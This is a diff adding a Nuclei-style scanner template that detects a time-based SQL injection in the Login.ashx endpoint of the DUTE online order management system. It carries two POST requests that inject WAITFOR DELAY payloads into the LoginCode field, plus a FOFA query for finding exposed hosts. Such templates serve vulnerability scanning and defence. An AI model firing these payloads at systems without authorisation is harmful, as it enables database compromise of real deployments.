@@ -1,0 +1,39 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration_1>=4 && duration_1<=5
+            - duration_2>=8 && duration_2<=9
+          type: dsl
+      raw:
+        - |
+          POST /ajax/Login.ashx HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+          Accept-Encoding: gzip, deflate
+          Accept-Language: zh-CN,zh;q=0.9
+          Connection: close
+          Content-Type: application/x-www-form-urlencoded
+
+          LoginCode=1';WAITFOR+DELAY+'0:0:4'--&Password=1&ckRemember=0
+        - |
+          POST /ajax/Login.ashx HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+          Accept-Encoding: gzip, deflate
+          Accept-Language: zh-CN,zh;q=0.9
+          Connection: close
+          Content-Type: application/x-www-form-urlencoded
+
+          LoginCode=1';WAITFOR+DELAY+'0:0:8'--&Password=1&ckRemember=0
+id: dute-Login_ashx-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: app="TUTORSOFT-ERP"
+        由于杜特网上订单管理系统 Login.ashx 接口未对用户传入的参数进行合理的校验和过滤，导致传入的参数直接携带到数据库执行，导致SQL注入漏洞，未经身份验证的攻击者可通过此漏洞获取数据库权限，深入利用可获取服务器权限。
+    name: 杜特网上订单管理系统 Login.ashx  SQL注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/DtG15fJK8geB2zBa5_bqCA?token=968846615&lang=zh_CN
+    severity: high
+    tags: []
